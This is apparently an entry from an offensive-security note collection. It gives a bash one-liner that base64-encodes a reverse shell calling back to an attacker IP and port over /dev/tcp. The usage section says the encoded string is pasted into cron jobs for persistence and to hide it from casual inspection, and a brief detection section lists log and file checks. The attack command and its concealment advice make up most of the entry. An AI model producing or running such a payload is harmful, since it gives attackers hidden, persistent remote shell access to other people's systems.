---
type: code
language: bash
verified: true
platforms:
  - Linux
tags:
  - encoding
  - payload
  - persistence
validated: true
---

# Base64-Encode-Reverse-Shell-Payload

## Code

```bash
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```

## Description

This script encodes a bash reverse shell payload into base64 format, allowing safe embedding in text-based configurations like cron jobs without syntax issues. The -w 0 option ensures a single-line output suitable for direct insertion.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_IP | IP in the payload to encode | 10.10.14.1 |
| $_TARGET_PORT | Port in the payload to encode | 4443 |

## Usage

Run on the attacker machine to generate the encoded string, then paste into cron templates or scripts. Used in persistence setups where payloads must be hidden from casual inspection.

## Detection

- Log analysis for base64 decoding in cron executions (e.g., grep logs for 'base64 -d | bash').
- File monitoring in /etc/cron.d/ for new base64 strings.
- Behavioral detection of echo | base64 patterns in process arguments.

## Related

- [[procedures/Schedule-Cron-Job-with-Root-Write-Privileges]]
- [[commands/base64-encode-string]]
